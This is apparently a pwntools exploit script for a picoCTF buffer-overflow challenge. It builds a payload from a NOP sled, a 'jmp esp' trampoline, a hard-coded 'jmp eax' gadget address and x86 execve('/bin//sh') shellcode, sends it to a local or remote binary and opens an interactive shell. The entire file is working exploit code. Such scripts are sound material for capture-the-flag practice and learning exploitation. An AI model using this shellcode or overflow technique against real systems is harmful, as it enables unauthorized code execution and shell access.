#!/usr/bin/env python3

from pwn import * 

elf = ELF('./vuln')

if args.REMOTE:
    p = remote('saturn.picoctf.net',55772)
else:
    p = process(elf.path)

# payload buffer
payload = b"\x90" * 6 # nop sled
payload += b"\xff\xe4" # jmp esp - jump to the shell code right after the return address
payload += b"\x90" * 20
payload += p32(0x0805334b) # jmp eax - will jump to start of buf which jumps again to the shell code right after the retur address
payload += b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" # shell code

print(p.recvuntil('!'))
p.sendline(payload)
p.interactive()
